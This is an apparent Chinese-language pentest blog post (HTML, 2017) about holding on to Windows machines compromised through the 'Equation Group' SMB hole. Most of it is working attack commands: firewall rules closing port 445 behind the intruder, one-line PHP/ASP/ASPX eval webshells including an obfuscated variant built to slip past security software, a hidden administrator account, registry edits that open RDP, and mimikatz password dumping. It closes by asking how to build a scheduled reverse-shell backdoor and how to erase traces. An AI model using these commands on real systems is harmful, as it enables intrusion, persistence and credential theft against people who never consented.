@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>windows方程式漏洞利用相关</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/windows-shadow.html" rel="bookmark"
+           title="Permalink to windows方程式漏洞利用相关">windows方程式漏洞利用相关</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-05-04T00:00:00+02:00">
+                <a href='#'>05/04/2017 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <h2>445端口关闭打开</h2>
+<p>这个洞很简单就可以拿到system权限，先说权限维持。</p>
+<h4>首先第一个关掉445:</h4>
+<div class="highlight"><pre><span></span><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="k">set</span> <span class="n">allprofiles</span> <span class="k">state</span> <span class="k">on</span>  <span class="o">//</span><span class="err">打开防火墙</span>
+<span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="k">add</span> <span class="k">rule</span> <span class="n">name</span><span class="o">=</span><span class="ss">&quot;Close Port 445&quot;</span> <span class="n">dir</span><span class="o">=</span><span class="k">in</span> <span class="n">action</span><span class="o">=</span><span class="p">[</span><span class="n">block</span><span class="o">|</span><span class="n">allow</span><span class="p">]</span> <span class="n">protocol</span><span class="o">=</span><span class="n">TCP</span> <span class="n">localport</span><span class="o">=</span><span class="mi">445</span>  <span class="o">//</span><span class="err">关掉打开</span><span class="mi">445</span><span class="err">端口</span>
+
+ <span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="k">add</span> <span class="k">rule</span> <span class="n">name</span><span class="o">=</span><span class="ss">&quot;Open SQL Server Port 1433&quot;</span> <span class="n">dir</span><span class="o">=</span><span class="k">in</span> <span class="n">action</span><span class="o">=</span><span class="n">allow</span> <span class="n">protocol</span><span class="o">=</span><span class="n">TCP</span> <span class="n">localport</span><span class="o">=</span><span class="mi">1433</span>  <span class="o">//</span><span class="err">打开</span><span class="mi">1433</span><span class="err">端口</span>
+
+ <span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="k">add</span> <span class="k">rule</span> <span class="n">name</span><span class="o">=</span><span class="ss">&quot;Allow Messenger&quot;</span> <span class="n">dir</span><span class="o">=</span><span class="k">in</span> <span class="n">action</span><span class="o">=</span><span class="n">allow</span> <span class="n">program</span><span class="o">=</span><span class="ss">&quot;C:\programfiles\messenger\msnmsgr.exe&quot;</span> <span class="o">//</span><span class="err">将某个</span><span class="n">exe加入防火墙</span>
+</pre></div>
+
+
+<ul>
+<li><a href="https://technet.microsoft.com/en-us/library/dd734783(v=ws.10).aspx#BKMK_3_set">https://technet.microsoft.com/en-us/library/dd734783(v=ws.10).aspx#BKMK_3_set</a>  官方man手册</li>
+<li><a href="https://support.microsoft.com/en-us/help/947709/how-to-use-the-netsh-advfirewall-firewall-context-instead-of-the-netsh-firewall-context-to-control-windows-firewall-behavior-in-windows-server-2008-and-in-windows-vista">https://support.microsoft.com/en-us/help/947709/how-to-use-the-netsh-advfirewall-firewall-context-instead-of-the-netsh-firewall-context-to-control-windows-firewall-behavior-in-windows-server-2008-and-in-windows-vista</a>  老的语法和新的</li>
+<li><a href="http://windowsitpro.com/windows-server/top-10-windows-firewall-netsh-commands">http://windowsitpro.com/windows-server/top-10-windows-firewall-netsh-commands</a> 各种各样的实际例子</li>
+</ul>
+<h4>写个过狗的webshell</h4>
+<div class="highlight"><pre><span></span><span class="n">echo</span><span class="w"> </span><span class="ss">&quot;&lt;?php @eval($_REQUEST[&quot;</span><span class="n">shell</span><span class="ss">&quot;]);?&gt;&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="w"></span>
+<span class="n">echo</span><span class="w"> </span><span class="ss">&quot;&lt;?php $a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e=&#39;($_REQUEST[a])&#39;;@assert($a.$b.$c.$d.$e);?&gt;&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="w"></span>
+<span class="n">echo</span><span class="w"> </span><span class="ss">&quot;&lt;%@ Page Language=&quot;</span><span class="n">Jscript</span><span class="ss">&quot;%&gt;&lt;%eval(Request.Item[&quot;</span><span class="n">shell</span><span class="ss">&quot;],&quot;</span><span class="n">unsafe</span><span class="ss">&quot;);%&gt;&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="n">aspx</span><span class="w"></span>
+<span class="n">echo</span><span class="w"> </span><span class="ss">&quot;&lt;%eval request(&quot;</span><span class="n">shell</span><span class="ss">&quot;)%&gt;&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="n">asp</span><span class="w"></span>
+</pre></div>
+
+
+<ol>
+<li>在获取最高权限之后，一般找个文件写shell，这个shell最好是<strong>一句话过狗</strong>，不管哪种系统，如果可以写一句话过狗最好写过狗。后期目标可能会上安全狗之类的软件，有了过狗的shell之后，方便下次绕过。</li>
+</ol>
+<h4>windows权限维持</h4>
+<p>从system写入webshell之后权限一般会变低:)，这个时候用ms16-032提权添加用户，通过webshell上传mimikatz抓取密码.</p>
+<h5>添加后门上远控</h5>
+<div class="highlight"><pre><span></span><span class="n">net</span> <span class="k">user</span> <span class="n">PHPNET$</span> <span class="mi">1234</span><span class="n">abcd</span><span class="o">~</span> <span class="o">/</span><span class="k">add</span>     <span class="o">//</span><span class="err">添加用户</span>
+<span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span> <span class="n">PHPNET$</span> <span class="o">/</span><span class="k">add</span>  <span class="o">//</span><span class="err">将用户添加到管理组</span>
+<span class="n">net</span> <span class="k">user</span> <span class="n">PHPNET$</span> <span class="o">/</span><span class="n">del</span>   <span class="o">//</span><span class="err">删除用户</span>
+</pre></div>
+
+
+<p>添加用户之后远程连接过去:</p>
+<div class="highlight"><pre><span></span> <span class="n">REG</span> <span class="n">query</span> <span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Control</span><span class="err">\</span><span class="n">Terminal</span><span class="ss">&quot; &quot;</span><span class="n">Server</span><span class="err">\</span><span class="n">WinStations</span><span class="err">\</span><span class="n">RDP</span><span class="o">-</span><span class="n">Tcp</span> <span class="o">/</span><span class="n">v</span> <span class="n">PortNumber</span> <span class="o">//</span><span class="err">在</span><span class="n">webshell下查看3389端口是否更改</span><span class="err">，出来的结果是</span><span class="mi">16</span><span class="err">进制</span>
+
+ <span class="err">以下未测试：</span>
+
+<span class="err">开启</span><span class="mi">3389</span><span class="err">端口</span><span class="n">dos命令</span><span class="err">（开启</span><span class="n">XP</span><span class="o">&amp;</span><span class="mi">2003</span><span class="err">终端服务）</span>
+<span class="err">方法</span> <span class="err">一</span> <span class="err">：</span><span class="n">REG</span> <span class="k">ADD</span> <span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Control</span><span class="err">\</span><span class="n">Terminal</span><span class="ss">&quot; &quot;</span><span class="n">Server</span> <span class="o">/</span><span class="n">v</span> <span class="n">fDenyTSConnections</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">00000000</span> <span class="o">/</span><span class="n">f</span>
+<span class="err">方法</span> <span class="err">二</span> <span class="err">：</span><span class="n">REG</span> <span class="k">add</span> <span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Control</span><span class="err">\</span><span class="n">Terminal</span><span class="ss">&quot; &quot;</span><span class="n">Server</span> <span class="o">/</span><span class="n">v</span> <span class="n">fDenyTSConnections</span> <span class="o">/</span><span class="n">d</span> <span class="mi">0</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">f</span>
+
+<span class="err">查看</span><span class="mi">3389</span><span class="err">端口是否开启</span>
+<span class="n">REG</span> <span class="n">query</span> <span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Control</span><span class="err">\</span><span class="n">Terminal</span><span class="ss">&quot; &quot;</span><span class="n">Server</span> <span class="o">/</span><span class="n">v</span> <span class="n">fDenyTSConnections</span> <span class="cm">/*如果是0x0则开启</span>
+
+<span class="cm">更改终端端口为2008(十六进制为：0x7d8)</span>
+<span class="cm">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f</span>
+<span class="cm">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f</span>
+
+<span class="cm">取消xp&amp;2003系统防火墙对终端服务的限制及IP连接的限制：</span>
+<span class="cm">REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f</span>
+</pre></div>
+
+
+<p>此时可以链接3389</p>
+<p>然后抓取密码</p>
+<div class="highlight"><pre><span></span><span class="nv">D</span>:\<span class="o">&gt;</span><span class="nv">mimikatz</span>.<span class="nv">exe</span> <span class="s2">&quot;&quot;</span><span class="nv">privilege</span>::<span class="nv">debug</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="nv">log</span> <span class="nv">sekurlsa</span>::<span class="nv">logonpasswords</span> <span class="nv">full</span><span class="s2">&quot;&quot;</span> <span class="k">exit</span> <span class="o">&amp;&amp;</span> <span class="nv">dir</span>   <span class="o">//</span>打印输出<span class="nv">mimikatz</span>
+<span class="nv">D</span>:\<span class="o">&gt;</span><span class="nv">mimikatz</span>.<span class="nv">exe</span> <span class="s2">&quot;&quot;</span><span class="nv">privilege</span>::<span class="nv">debug</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="nv">sekurlsa</span>::<span class="nv">logonpasswords</span> <span class="nv">full</span><span class="s2">&quot;&quot;</span> <span class="k">exit</span> <span class="o">&gt;&gt;</span> <span class="nv">log</span>.<span class="nv">txt</span> <span class="o">//</span>输出到<span class="nv">log</span>.<span class="nv">txt</span>
+</pre></div>
+
+
+<h3>待解决的问题</h3>
+<ul>
+<li>
+<p>除了远控，如何通过powershell，在windows上面建立一个定时的任务，类似linux的crontab后门，只添加一个定时执行的任务，比如每5分钟反弹某个服务器。如何达成？</p>
+</li>
+<li>
+<p>是否存在某个powershell脚本可以清理当前的渗透测试记录？</p>
+</li>
+</ul>
+<p>参考资料：</p>
+<ul>
+<li><a href="http://www.jozxing.cc/archives/976">http://www.jozxing.cc/archives/976</a></li>
+<li><a href="http://www.jozxing.cc/archives/374">http://www.jozxing.cc/archives/374</a></li>
+</ul>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
